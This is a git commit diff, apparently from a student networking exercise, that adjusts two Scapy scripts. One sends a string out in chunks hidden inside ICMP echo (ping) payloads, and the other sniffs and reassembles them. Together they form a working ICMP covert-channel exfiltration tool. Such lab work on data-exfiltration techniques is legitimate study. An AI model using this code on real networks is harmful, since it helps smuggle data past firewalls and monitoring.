6a771d26e728ed7fde4e4ca4a085c79b439e9346
ninjawill543 <lucas.hanson@ynov.com>
2023-11-28 19:23:18 +0100

    making sure we only get the packets we want

--- TP-4/icmp_exf_receive_b1.py
+++ TP-4/icmp_exf_receive_b1.py
@@ -3,11 +3,11 @@ from scapy.all import sniff, ICMP
 output = ""
 def print_it_please(packet):
     global output
-    if (packet['ICMP'].type == 8 and len(packet['Raw'].load) <= 3):
-        if (packet['Raw'].load.decode("utf-8") == "°0°"):
+    if (packet['ICMP'].type == 8 and len(packet['Raw'].load) <= 7):
+        if (packet['Raw'].load.decode("utf-8") == "°°°0°°°"):
             print(output)
             quit()
-        elif (packet['Raw'].load.decode("utf-8") != "°1°"):
+        elif (packet['Raw'].load.decode("utf-8") != "°°°1°°°"):
             output = output + packet['Raw'].load.decode("utf-8")    
         
 sniff(filter="icmp", prn=print_it_please, count=0)
--- TP-4/icmp_exf_send_b1.py
+++ TP-4/icmp_exf_send_b1.py
@@ -1,19 +1,19 @@
 from scapy.all import IP, ICMP, send
 import sys
 
-start_value = "°1°"
+start_value = "°°°1°°°"
 start = (IP(dst=sys.argv[1])/ICMP()/start_value)
 send(start)
 
 to_send = str(sys.argv[2])
     
-list = ([to_send[i:i + 3] for i in range(0, len(to_send), 3)])
+list = ([to_send[i:i + 7] for i in range(0, len(to_send), 7)])
 
 for i in list:
     packet = (IP(dst=sys.argv[1])/ICMP()/i)
     send(packet)
 
 
-end_value = "°0°"
+end_value = "°°°0°°°"
 end = (IP(dst=sys.argv[1])/ICMP()/end_value)
 send(end)
